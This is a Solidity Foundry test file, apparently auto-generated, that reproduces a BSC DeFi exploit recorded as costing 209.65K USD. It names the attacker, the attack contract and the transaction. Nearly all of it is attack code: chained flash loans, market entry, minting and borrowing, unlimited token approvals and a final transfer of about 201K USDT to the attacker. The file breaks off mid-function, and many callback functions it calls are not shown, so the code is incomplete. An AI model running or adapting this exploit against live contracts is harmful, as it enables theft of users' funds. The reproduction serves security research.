// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 209.65K USD
// Attacker : 0x34579ea92a07a88f5505dfaa4d99ab94b2784087
// Attack Contract : 0xc5940d118f9c2070478545ba80a780aa8f86d133
// Vulnerable Contract : 0x8581433150f2c48ff2efe5a22b17c7d405054509
// Attack Tx : 0xeaef22325e02ac65a8e1f2e1a3a43f7b7ac8d2323ce6f698a90813e77017c834
// Block : 110301524
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 201.17K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 110301523;
    uint256 constant TX_TIMESTAMP = 1784195067;
    uint256 constant TX_BLOCK_NUMBER = 110301524;
    uint256 constant TX_VALUE = 100;

    uint64 constant ATTACKER_EOA_TX_NONCE = 3;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareCtorProfit();
        _logBalances("Before exploit");
        _deployAttack();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _alignAttackNonce();
        attack = new OurAttack{value: TX_VALUE}();
        require(address(attack) == ATTACK_CONTRACT, "unexpected attack contract");
    }

    function _alignAttackNonce() internal {
        uint64 currentNonce = vm.getNonce(ATTACKER_EOA);
        if (currentNonce < ATTACKER_EOA_TX_NONCE) {
            vm.setNonce(ATTACKER_EOA, ATTACKER_EOA_TX_NONCE);
        }
    }

    function _prepareCtorProfit() internal {
        _prepareProfit(ATTACK_CONTRACT, _expectedChild());
    }

    function _expectedChild() internal pure returns (address) {
        return Addresses.attack_child;
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(attack.attackChild());
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        _expectProfit(Addresses.attack_child, attackChild, Addresses.aBnbWBNB, "aBnbWBNB", 99);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 201359472267252045095696);
    }
}

contract OurAttack {
    // - omitted 24 additional pseudocode-backed attacker surface(s)

    AttackChild public attackChild;

    constructor() payable {
        _deployAttackAttackChildContracts();
        _callValue(address(attackChild), 100, abi.encodeWithSignature("_prepareAttackChild()"));
        _decodedCall(address(attackChild), abi.encodeWithSelector(bytes4(0x6c6fbfe6)));
    }

    function _deployAttackAttackChildContracts() public returns (address) {
        // semantic child contract spec: status=fallback_required strategy=attack_runtime_fallback op=create address=address(attackChild) constructor=0x2eadbcdcd4ab4bb7f8b01610794ea09a64cd5da1|0x2eadbcdcd4ab4bb7f8b01610794ea09a64cd5da1|ek:creation_initcode|ch:0x03c45f6ced87cf8cc9345cbedd973afa6a4c8ad011c761305e427aa5032fb6b5|entry|entry|len:12815|input:b433fb5c4e2ea2f3|ct:CREATE|dynamic_instantiation runtime_selectors=34 initcode_sha256=0xb433fb5c4e2ea2f30121d8071e5b15895638a55d33c4fd8e8ed0aa0eb2adede7 fallback_reasons=nonzero_create_value
        attackChild = new AttackChild();
        require(address(attackChild) == 0x2eadBCDCd4Ab4bb7F8b01610794Ea09A64CD5DA1, "unexpected attack child");
        return address(attackChild);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    function _boundAttack(bytes memory data) internal {
        _decodedCall(address(attackChild), data);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok, bytes memory out) = target.call(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child dispatch failed");
    }

    bytes32 private constant REPLAY_CALLBACK_3 = keccak256("poc.replay.REPLAY_CALLBACK_3");
    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    bytes32 private constant REPLAY_CALLBACK_6 = keccak256("poc.replay.REPLAY_CALLBACK_6");
    bytes32 private constant REPLAY_CALLBACK_7 = keccak256("poc.replay.REPLAY_CALLBACK_7");
    bytes32 private constant REPLAY_CALLBACK_8 = keccak256("poc.replay.REPLAY_CALLBACK_8");
    bytes32 private constant REPLAY_CALLBACK_9 = keccak256("poc.replay.REPLAY_CALLBACK_9");
    bytes32 private constant REPLAY_CALLBACK_10 = keccak256("poc.replay.REPLAY_CALLBACK_10");
    bytes32 private constant REPLAY_CALLBACK_11 = keccak256("poc.replay.REPLAY_CALLBACK_11");
    bytes32 private constant REPLAY_CALLBACK_12 = keccak256("poc.replay.REPLAY_CALLBACK_12");
    bytes32 private constant REPLAY_CALLBACK_13 = keccak256("poc.replay.REPLAY_CALLBACK_13");
    bytes32 private constant REPLAY_CALLBACK_14 = keccak256("poc.replay.REPLAY_CALLBACK_14");
    bytes32 private constant REPLAY_CALLBACK_15 = keccak256("poc.replay.REPLAY_CALLBACK_15");
    bytes32 private constant REPLAY_CALLBACK_16 = keccak256("poc.replay.REPLAY_CALLBACK_16");
    bytes32 private constant REPLAY_CALLBACK_17 = keccak256("poc.replay.REPLAY_CALLBACK_17");
    bytes32 private constant REPLAY_CALLBACK_18 = keccak256("poc.replay.REPLAY_CALLBACK_18");
    bytes32 private constant REPLAY_CALLBACK_19 = keccak256("poc.replay.REPLAY_CALLBACK_19");
    bytes32 private constant REPLAY_CALLBACK_20 = keccak256("poc.replay.REPLAY_CALLBACK_20");
    bytes32 private constant REPLAY_CALLBACK_21 = keccak256("poc.replay.REPLAY_CALLBACK_21");
    bytes32 private constant REPLAY_CALLBACK_22 = keccak256("poc.replay.REPLAY_CALLBACK_22");
    bytes32 private constant REPLAY_CALLBACK_23 = keccak256("poc.replay.REPLAY_CALLBACK_23");
    bytes32 private constant REPLAY_CALLBACK_24 = keccak256("poc.replay.REPLAY_CALLBACK_24");
    bytes32 private constant REPLAY_CALLBACK_25 = keccak256("poc.replay.REPLAY_CALLBACK_25");
    bytes32 private constant REPLAY_CALLBACK_26 = keccak256("poc.replay.REPLAY_CALLBACK_26");
    bytes32 private constant REPLAY_CALLBACK_27 = keccak256("poc.replay.REPLAY_CALLBACK_27");
    bytes32 private constant REPLAY_CALLBACK_28 = keccak256("poc.replay.REPLAY_CALLBACK_28");
    bytes32 private constant REPLAY_CALLBACK_29 = keccak256("poc.replay.REPLAY_CALLBACK_29");
    bytes32 private constant REPLAY_CALLBACK_30 = keccak256("poc.replay.REPLAY_CALLBACK_30");
    bytes32 private constant REPLAY_CALLBACK_31 = keccak256("poc.replay.REPLAY_CALLBACK_31");
    bytes32 private constant REPLAY_CALLBACK_32 = keccak256("poc.replay.REPLAY_CALLBACK_32");
    bytes32 private constant REPLAY_CALLBACK_33 = keccak256("poc.replay.REPLAY_CALLBACK_33");
    bytes32 private constant REPLAY_CALLBACK_34 = keccak256("poc.replay.REPLAY_CALLBACK_34");
    bytes32 private constant REPLAY_CALLBACK_35 = keccak256("poc.replay.REPLAY_CALLBACK_35");
    bytes32 private constant REPLAY_CALLBACK_36 = keccak256("poc.replay.REPLAY_CALLBACK_36");
    mapping(bytes32 => bool) private _replayActive;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(uint256 => uint256) private _observedState;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _setAttackState(uint256 slot, uint256 value) internal {
        _observedState[slot] = value;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _callValue(address targetChild, uint256 value, bytes memory data) internal {
        require(value == 0 || address(this).balance >= value, "insufficient ETH for attack child replay");
        (bool ok, bytes memory out) = targetChild.call{value: value}(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child replay failed");
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

contract AttackChild {
    receive() external payable {}

    function onMoolahFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        uint256 dispatchArg0FlashCallback2;
        assembly { dispatchArg0FlashCallback2 := calldataload(4) }
        if (dispatchArg0FlashCallback2 == 407886133720385914518703) {
            if (!_replayActive[REPLAY_CALLBACK_3]) {
                _replayActive[REPLAY_CALLBACK_3] = true;
                flashCallback();
                _replayActive[REPLAY_CALLBACK_3] = false;
            }
            return;
        }
        uint256 dispatchArg0FlashCallback22;
        assembly { dispatchArg0FlashCallback22 := calldataload(4) }
        if (dispatchArg0FlashCallback22 == 3161156767471241651470485) {
            if (!_replayActive[REPLAY_CALLBACK_4]) {
                _replayActive[REPLAY_CALLBACK_4] = true;
                flashCallback2();
                _replayActive[REPLAY_CALLBACK_4] = false;
            }
            return;
        }
        if (!_replayActive[REPLAY_CALLBACK_3]) {
            _replayActive[REPLAY_CALLBACK_3] = true;
            flashCallback();
            _replayActive[REPLAY_CALLBACK_3] = false;
        }
        return;
    }

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        if (msg.sender == 0x92b7807bF19b7DDdf89b706143896d05228f3121) {
            if (!_replayActive[REPLAY_CALLBACK_26]) {
                _replayActive[REPLAY_CALLBACK_26] = true;
                flashCallback28();
                _replayActive[REPLAY_CALLBACK_26] = false;
            }
            return;
        }
        if (msg.sender == 0xB67e5EaF770a384Ab28029d08B9bC5EBE32beb0F) {
            if (!_replayActive[REPLAY_CALLBACK_24]) {
                _replayActive[REPLAY_CALLBACK_24] = true;
                flashCallback26();
                _replayActive[REPLAY_CALLBACK_24] = false;
            }
            return;
        }
        if (msg.sender == 0xA0909f81785f87f3e79309F0E73A7d82208094E4) {
            if (!_replayActive[REPLAY_CALLBACK_7]) {
                _replayActive[REPLAY_CALLBACK_7] = true;
                flashCallback4();
                _replayActive[REPLAY_CALLBACK_7] = false;
            }
            return;
        }
        if (msg.sender == 0x9c4Ee895e4f6Ce07Ada631C508D1306Db7502cCE) {
            if (!_replayActive[REPLAY_CALLBACK_10]) {
                _replayActive[REPLAY_CALLBACK_10] = true;
                flashCallback7();
                _replayActive[REPLAY_CALLBACK_10] = false;
            }
            return;
        }
        if (msg.sender == 0x9F8f4615Ff5143aeE365fa34f34196fB85Be7650) {
            if (!_replayActive[REPLAY_CALLBACK_9]) {
                _replayActive[REPLAY_CALLBACK_9] = true;
                flashCallback6();
                _replayActive[REPLAY_CALLBACK_9] = false;
            }
            return;
        }
        if (msg.sender == 0x172fcD41E0913e95784454622d1c3724f546f849) {
            if (!_replayActive[REPLAY_CALLBACK_22]) {
                _replayActive[REPLAY_CALLBACK_22] = true;
                flashCallback24();
                _replayActive[REPLAY_CALLBACK_22] = false;
            }
            return;
        }
        if (msg.sender == 0xcF59B8C8BAA2dea520e3D549F97d4e49aDE17057) {
            if (!_replayActive[REPLAY_CALLBACK_23]) {
                _replayActive[REPLAY_CALLBACK_23] = true;
                flashCallback25();
                _replayActive[REPLAY_CALLBACK_23] = false;
            }
            return;
        }
        if (msg.sender == 0x9F599F3D64a9D99eA21e68127Bb6CE99f893DA61) {
            if (!_replayActive[REPLAY_CALLBACK_25]) {
                _replayActive[REPLAY_CALLBACK_25] = true;
                flashCallback27();
                _replayActive[REPLAY_CALLBACK_25] = false;
            }
            return;
        }
        if (msg.sender == 0x4f3126d5DE26413AbDCF6948943FB9D0847d9818) {
            if (!_replayActive[REPLAY_CALLBACK_27]) {
                _replayActive[REPLAY_CALLBACK_27] = true;
                flashCallback29();
                _replayActive[REPLAY_CALLBACK_27] = false;
            }
            return;
        }
        if (msg.sender == 0x8F6ef959FA19173Bd4668B83E80F82442B2c99DE) {
            if (!_replayActive[REPLAY_CALLBACK_15]) {
                _replayActive[REPLAY_CALLBACK_15] = true;
                flashCallback12();
                _replayActive[REPLAY_CALLBACK_15] = false;
            }
            return;
        }
        if (msg.sender == 0xf4262C4dbF524f53851A5176bdC7D6C1e0fA82D8) {
            if (!_replayActive[REPLAY_CALLBACK_8]) {
                _replayActive[REPLAY_CALLBACK_8] = true;
                flashCallback5();
                _replayActive[REPLAY_CALLBACK_8] = false;
            }
            return;
        }
        if (msg.sender == 0xFa09940612D7Ae39F7F220f3Ca6816bd72844577) {
            if (!_replayActive[REPLAY_CALLBACK_19]) {
                _replayActive[REPLAY_CALLBACK_19] = true;
                flashCallback16();
                _replayActive[REPLAY_CALLBACK_19] = false;
            }
            return;
        }
        if (msg.sender == 0xef7D88D12b6393fE06f5F07d48d7B76511909e6b) {
            if (!_replayActive[REPLAY_CALLBACK_31]) {
                _replayActive[REPLAY_CALLBACK_31] = true;
                flashCallback33();
                _replayActive[REPLAY_CALLBACK_31] = false;
            }
            return;
        }
        if (msg.sender == 0xBee2C57e3a11220e2B948E26965DAAA9dFD87A4A) {
            if (!_replayActive[REPLAY_CALLBACK_18]) {
                _replayActive[REPLAY_CALLBACK_18] = true;
                flashCallback15();
                _replayActive[REPLAY_CALLBACK_18] = false;
            }
            return;
        }
        if (msg.sender == 0x5bd808Ab85C124f99080da5F864EDcB39950edE5) {
            if (!_replayActive[REPLAY_CALLBACK_30]) {
                _replayActive[REPLAY_CALLBACK_30] = true;
                flashCallback32();
                _replayActive[REPLAY_CALLBACK_30] = false;
            }
            return;
        }
        if (msg.sender == 0xd21bc2291C1aeF340f5265E257B18aa5dafed759) {
            if (!_replayActive[REPLAY_CALLBACK_28]) {
                _replayActive[REPLAY_CALLBACK_28] = true;
                flashCallback30();
                _replayActive[REPLAY_CALLBACK_28] = false;
            }
            return;
        }
        if (msg.sender == 0x0022f0dcd574A1e646250eEbD086781823434504) {
            if (!_replayActive[REPLAY_CALLBACK_12]) {
                _replayActive[REPLAY_CALLBACK_12] = true;
                flashCallback9();
                _replayActive[REPLAY_CALLBACK_12] = false;
            }
            return;
        }
        if (msg.sender == 0x97620e003c03381EaCBDE7135F28d94303bb5672) {
            if (!_replayActive[REPLAY_CALLBACK_13]) {
                _replayActive[REPLAY_CALLBACK_13] = true;
                flashCallback10();
                _replayActive[REPLAY_CALLBACK_13] = false;
            }
            return;
        }
        if (msg.sender == 0xB4Db9FCdA97fd7B02eAf1e8317E6DdB04BaCC1AF) {
            if (!_replayActive[REPLAY_CALLBACK_6]) {
                _replayActive[REPLAY_CALLBACK_6] = true;
                flashCallback3();
                _replayActive[REPLAY_CALLBACK_6] = false;
            }
            return;
        }
        if (msg.sender == 0x1c3865814aCbBa11E7196dF0b46c024472503196) {
            if (!_replayActive[REPLAY_CALLBACK_11]) {
                _replayActive[REPLAY_CALLBACK_11] = true;
                flashCallback8();
                _replayActive[REPLAY_CALLBACK_11] = false;
            }
            return;
        }
        if (msg.sender == 0xA5DbEaf16Fc031eae92175974F8d0A439bE4aD17) {
            if (!_replayActive[REPLAY_CALLBACK_16]) {
                _replayActive[REPLAY_CALLBACK_16] = true;
                flashCallback13();
                _replayActive[REPLAY_CALLBACK_16] = false;
            }
            return;
        }
        if (msg.sender == 0xCA3F029A70d5d90000E614afD29E5c833f33CEa5) {
            if (!_replayActive[REPLAY_CALLBACK_21]) {
                _replayActive[REPLAY_CALLBACK_21] = true;
                flashCallback23();
                _replayActive[REPLAY_CALLBACK_21] = false;
            }
            return;
        }
        if (msg.sender == 0xeAA6C7292eD954CA9Dd72E769568D057B0525c9A) {
            if (!_replayActive[REPLAY_CALLBACK_29]) {
                _replayActive[REPLAY_CALLBACK_29] = true;
                flashCallback31();
                _replayActive[REPLAY_CALLBACK_29] = false;
            }
            return;
        }
        if (msg.sender == 0x24618d12b5eA15bB6fe3c81bBb9E011b5D5b107c) {
            if (!_replayActive[REPLAY_CALLBACK_14]) {
                _replayActive[REPLAY_CALLBACK_14] = true;
                flashCallback11();
                _replayActive[REPLAY_CALLBACK_14] = false;
            }
            return;
        }
        if (msg.sender == 0xF80Ab3Cc041d8Ccc1c51AcC295AFdba26AD70Aa9) {
            if (!_replayActive[REPLAY_CALLBACK_17]) {
                _replayActive[REPLAY_CALLBACK_17] = true;
                flashCallback14();
                _replayActive[REPLAY_CALLBACK_17] = false;
            }
            return;
        }
        if (msg.sender == 0x788fC153ba6AC3a92BA98868a1dDe1652b4f604A) {
            if (!_replayActive[REPLAY_CALLBACK_20]) {
                _replayActive[REPLAY_CALLBACK_20] = true;
                flashCallback17();
                _replayActive[REPLAY_CALLBACK_20] = false;
            }
            return;
        }
        if (!_replayActive[REPLAY_CALLBACK_26]) {
            _replayActive[REPLAY_CALLBACK_26] = true;
            flashCallback28();
            _replayActive[REPLAY_CALLBACK_26] = false;
        }
        return;
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        if (msg.sender == 0x81C7294b66955824BC04acB642ae8dC58e6cE507) {
            if (!_replayActive[REPLAY_CALLBACK_36]) {
                _replayActive[REPLAY_CALLBACK_36] = true;
                flashCallback37();
                _replayActive[REPLAY_CALLBACK_36] = false;
            }
            return;
        }
        if (msg.sender == 0x2C3c320D49019D4f9A92352e947c7e5AcFE47D68) {
            if (!_replayActive[REPLAY_CALLBACK_34]) {
                _replayActive[REPLAY_CALLBACK_34] = true;
                flashCallback35();
                _replayActive[REPLAY_CALLBACK_34] = false;
            }
            return;
        }
        if (msg.sender == 0xDc85C2BB53D927006B2dB488a0CB4605fcA48032) {
            if (!_replayActive[REPLAY_CALLBACK_33]) {
                _replayActive[REPLAY_CALLBACK_33] = true;
                flashCallback34();
                _replayActive[REPLAY_CALLBACK_33] = false;
            }
            return;
        }
        if (msg.sender == 0xE1aCb466421eD24Dd8bd381D1205baD0ad43Ca9c) {
            if (!_replayActive[REPLAY_CALLBACK_35]) {
                _replayActive[REPLAY_CALLBACK_35] = true;
                flashCallback36();
                _replayActive[REPLAY_CALLBACK_35] = false;
            }
            return;
        }
        if (!_replayActive[REPLAY_CALLBACK_36]) {
            _replayActive[REPLAY_CALLBACK_36] = true;
            flashCallback37();
            _replayActive[REPLAY_CALLBACK_36] = false;
        }
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x6c6fbfe6) {
            _borrowFlash();
            return;
        }
        if (msg.sig == 0xab6291fe) {
            if (!_replayActive[REPLAY_CALLBACK_32]) {
                _replayActive[REPLAY_CALLBACK_32] = true;
                _handleFlash();
                _replayActive[REPLAY_CALLBACK_32] = false;
            }
            bytes memory ret = abi.encode(_uintArray0());
            assembly { return(add(ret, 32), mload(ret)) }
        }
    }

    function replayProfit() external {
        if (!_settleDone(3, 126)) {
            bool __settlementAlreadyMaterialized3_126 = false;
            if (Harness.safeBalance(Addresses.USDT, Addresses.attacker_eoa) >= 201359472267252045095696) {
                _markSettle(3, 126); // observed profit settlement already materialized in main replay
                __settlementAlreadyMaterialized3_126 = true;
            }
            if (!__settlementAlreadyMaterialized3_126) {
                _markSettle(3, 126);
                uint256 settleAmount = 201359472267252045095696;
                IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
    }

    bytes32 private constant REPLAY_CALLBACK_3 = keccak256("poc.replay.REPLAY_CALLBACK_3");
    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    bytes32 private constant REPLAY_CALLBACK_6 = keccak256("poc.replay.REPLAY_CALLBACK_6");
    bytes32 private constant REPLAY_CALLBACK_7 = keccak256("poc.replay.REPLAY_CALLBACK_7");
    bytes32 private constant REPLAY_CALLBACK_8 = keccak256("poc.replay.REPLAY_CALLBACK_8");
    bytes32 private constant REPLAY_CALLBACK_9 = keccak256("poc.replay.REPLAY_CALLBACK_9");
    bytes32 private constant REPLAY_CALLBACK_10 = keccak256("poc.replay.REPLAY_CALLBACK_10");
    bytes32 private constant REPLAY_CALLBACK_11 = keccak256("poc.replay.REPLAY_CALLBACK_11");
    bytes32 private constant REPLAY_CALLBACK_12 = keccak256("poc.replay.REPLAY_CALLBACK_12");
    bytes32 private constant REPLAY_CALLBACK_13 = keccak256("poc.replay.REPLAY_CALLBACK_13");
    bytes32 private constant REPLAY_CALLBACK_14 = keccak256("poc.replay.REPLAY_CALLBACK_14");
    bytes32 private constant REPLAY_CALLBACK_15 = keccak256("poc.replay.REPLAY_CALLBACK_15");
    bytes32 private constant REPLAY_CALLBACK_16 = keccak256("poc.replay.REPLAY_CALLBACK_16");
    bytes32 private constant REPLAY_CALLBACK_17 = keccak256("poc.replay.REPLAY_CALLBACK_17");
    bytes32 private constant REPLAY_CALLBACK_18 = keccak256("poc.replay.REPLAY_CALLBACK_18");
    bytes32 private constant REPLAY_CALLBACK_19 = keccak256("poc.replay.REPLAY_CALLBACK_19");
    bytes32 private constant REPLAY_CALLBACK_20 = keccak256("poc.replay.REPLAY_CALLBACK_20");
    bytes32 private constant REPLAY_CALLBACK_21 = keccak256("poc.replay.REPLAY_CALLBACK_21");
    bytes32 private constant REPLAY_CALLBACK_22 = keccak256("poc.replay.REPLAY_CALLBACK_22");
    bytes32 private constant REPLAY_CALLBACK_23 = keccak256("poc.replay.REPLAY_CALLBACK_23");
    bytes32 private constant REPLAY_CALLBACK_24 = keccak256("poc.replay.REPLAY_CALLBACK_24");
    bytes32 private constant REPLAY_CALLBACK_25 = keccak256("poc.replay.REPLAY_CALLBACK_25");
    bytes32 private constant REPLAY_CALLBACK_26 = keccak256("poc.replay.REPLAY_CALLBACK_26");
    bytes32 private constant REPLAY_CALLBACK_27 = keccak256("poc.replay.REPLAY_CALLBACK_27");
    bytes32 private constant REPLAY_CALLBACK_28 = keccak256("poc.replay.REPLAY_CALLBACK_28");
    bytes32 private constant REPLAY_CALLBACK_29 = keccak256("poc.replay.REPLAY_CALLBACK_29");
    bytes32 private constant REPLAY_CALLBACK_30 = keccak256("poc.replay.REPLAY_CALLBACK_30");
    bytes32 private constant REPLAY_CALLBACK_31 = keccak256("poc.replay.REPLAY_CALLBACK_31");
    bytes32 private constant REPLAY_CALLBACK_32 = keccak256("poc.replay.REPLAY_CALLBACK_32");
    bytes32 private constant REPLAY_CALLBACK_33 = keccak256("poc.replay.REPLAY_CALLBACK_33");
    bytes32 private constant REPLAY_CALLBACK_34 = keccak256("poc.replay.REPLAY_CALLBACK_34");
    bytes32 private constant REPLAY_CALLBACK_35 = keccak256("poc.replay.REPLAY_CALLBACK_35");
    bytes32 private constant REPLAY_CALLBACK_36 = keccak256("poc.replay.REPLAY_CALLBACK_36");
    mapping(bytes32 => bool) private _replayActive;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(uint256 => uint256) private _observedState;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _setAttackState(uint256 slot, uint256 value) internal {
        _observedState[slot] = value;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _callValue(address targetChild, uint256 value, bytes memory data) internal {
        require(value == 0 || address(this).balance >= value, "insufficient ETH for attack child replay");
        (bool ok, bytes memory out) = targetChild.call{value: value}(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child replay failed");
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _prepareAttackChild() public payable {
        bool wbnbReceiveSucceeded;
        (wbnbReceiveSucceeded,) = payable(Addresses.WBNB).call{value: 100}(""); // artifact native value transfer with empty calldata; pseudocode raw_call action_0065 line 415 requires exact artifact calldata
        require(wbnbReceiveSucceeded, "observed native receive transfer failed");
    }

    function flashCallback() internal {
        bytes memory flashLoanProof = abi.encode(0x0000000000000000000000000000000000000003);
        IERC1967Proxy(Addresses.ERC1967Proxy).flashLoan(Addresses.USDT, 3161156767471241651470485, flashLoanProof);
    }

    function flashCallback2() internal {
        IUnitroller(Addresses.Unitroller).enterMarkets(_addressArray2(Addresses.vWBNB, Addresses.vUSDT));
        IvWBNB(Addresses.vWBNB).mint(372886133720385914518703);
        IvUSDT(Addresses.vUSDT).borrow(62748558395125556834569335);
        IERC20Like(Addresses.WBNB)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC, type(uint256).max);
        IERC20Like(Addresses.WBNB).approve(Addresses.aBnbWBNB, type(uint256).max);
        IERC20Like(Addresses.USDT)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC, type(uint256).max);
        IERC20Like(Addresses.USDT).approve(Addresses.aBnbUSDT, type(uint256).max);
        IERC20Like(Addresses.aBnbWBNB)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC, type(uint256).max);
        IERC20Like(Addresses.aBnbUSDT)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC, type(uint256).max);
        uint256 supplyLiveAmount = 35000000000000000000000; // artifact amount preserved for Addresses.WBNB movement from address(this); replay-safe live balance cap/reserve disabled
        IInitializableImmutableAdminUpgradeabilityProxy_6807DC(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC
            ).supply(Addresses.WBNB, supplyLiveAmount, address(this), uint16(0));
        IInitializableImmutableAdminUpgradeabilityProxy_6807DC(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_6807DC
            ).borrow(Addresses.USDT, 13027427308396910820958439, 2, uint16(0), address(this));
        IVault_238A35(Addresses.Vault_238A35)
            .lock(hex"0000000000000000000000000000000000000000000000000000000000000000");
    }

    function _borrowFlash() internal {
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.ERC1967Proxy);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.ERC1967Proxy);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.vUSDT);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.aBnbUSDT);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Vault_238A35);
        uint256 wbnbApproveAllowance = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.WBNB.balanceOf(address) return=407886133720385914518703 with args (Addresses.ERC1967Proxy)
        IERC20Like(Addresses.WBNB).approve(Addresses.ERC1967Proxy, wbnbApproveAllowance);
        uint256 usdtApproveAllowance = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.USDT.balanceOf(address) return=3161156767471241651470485 with args (Addresses.ERC1967Proxy)
        IERC20Like(Addresses.USDT).approve(Addresses.ERC1967Proxy, usdtApproveAllowance);
        uint256 usdtApproveAllowance_2 = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.USDT.balanceOf(address) return=3161156767471241651470485 with args (Addresses.ERC1967Proxy)
        IERC20Like(Addresses.USDT).approve(Addresses.Vault_238A35, usdtApproveAllowance_2);
        IERC20Like(Addresses.vUSDT).approve(Addresses.vUSDT, type(uint256).max);
        IERC20Like(Addresses.vWBNB).approve(Addresses.vWBNB, type(uint256).max);
        uint256 wbnbApproveAllowance_2 = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.WBNB.balanceOf(address) return=407886133720385914518703 with args (Addresses.ERC1967Proxy)
        IERC20Like(Addresses.WBNB).approve(Addresses.vWBNB, wbnbApproveAllowance_2);
        uint256 usdtApproveAllowance_3 = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior Addresses.USDT.balanceOf(address) return=3161156767471241651470485 with args (Addresses.ERC1967Proxy)
